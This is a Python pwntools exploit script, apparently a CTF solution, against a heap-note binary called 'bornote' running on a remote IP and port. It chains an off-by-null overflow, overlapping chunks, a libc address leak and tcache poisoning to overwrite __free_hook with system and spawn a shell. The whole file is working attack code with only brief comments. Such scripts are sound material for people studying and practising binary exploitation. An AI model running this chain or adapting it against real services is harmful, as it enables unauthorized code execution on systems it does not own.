#encoding:utf-8
from pwn import *
context.terminal = ['tmux','sp','-h']
context.log_level = 'DEBUG'
# sh = process('./bornote')

sh = remote('121.36.250.162',49154)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc-2.31.so')

def menu(choice):
    sh.recvuntil("cmd: ")
    sh.sendline(str(choice))
    
def add(size):
    menu(1)
    sh.recvuntil("Size: ")
    sh.sendline(str(size))

def edit(idx, content):
    menu(3)
    sh.recvuntil("Index: ")
    sh.sendline(str(idx))
    sh.recvuntil("Note: ")
    sh.sendline(content)

def delete(idx):
    menu(2)
    sh.recvuntil("Index: ")
    sh.sendline(str(idx))

def show(idx):
    menu(4)
    sh.recvuntil("Index: ")
    sh.sendline(str(idx))
    sh.recvuntil("Note: ")
    data = sh.recv(6)
    return data
sh.recvuntil("name:")
sh.sendline('aaa')

add(0x418) #0 fake->fd b390
add(0x128) #1
add(0x418) #2
add(0x438) #3 target bd00
add(0x148) #4
add(0x428) # 5 fake->bk c290
add(0x138) # 6
delete(0)
delete(3)
delete(5)
# 


delete(2) #2 & 3 unlink
add(0x438)  # 0 set size 
edit(0,b'a' * 0x418 + p64(0xb01)[:7])
add(0x418)  # 2 c20
add(0x428)  # 3 bk 190
add(0x418)  # 5 fd 290

delete(5)
delete(2)
add(0x418)  # 2 partial overwrite bk -> 9c00
edit(2,b'\x01' * 8)
add(0x418)  # 5 c20


delete(5)
delete(3)

add(0x5f8)  # 3 chunk into largebin
add(0x428)  # 5 partial overwrite fd
edit(5,b'')
add(0x418)  # 7 c20

## 触发offbynull 向前合并
# gdb.attach(sh,'b * $rebase(0x1781)')
add(0x108) #8 gap
edit(8,p64(0) + p64(0x111))
edit(6, b'\x01' * 0x138) #offbynull
edit(6, b'\x01' * 0x130 + p64(0xb00)) #prev_size

delete(3)
##

edit(1,'/bin/sh\x00')
add(0x10) #3
# show(7)
libc_base = u64(show(7).ljust(8,b'\x00')) - 0x1EBBE0
log.success("libc_base = " + hex(libc_base))
fake_fast = 0x1EBB3D + libc_base
# gdb.attach(sh,'b * $rebase(0x1E16)')

add(0x128) #9
delete(1) 
delete(9)
edit(7,p64(libc_base + libc.symbols["__free_hook"]))
add(0x128)
add(0x128) #9
edit(0,'/bin/sh\x00')
edit(9,p64(libc_base + libc.symbols["system"]))
sh.sendline('2')
sh.sendline('0')


sh.interactive()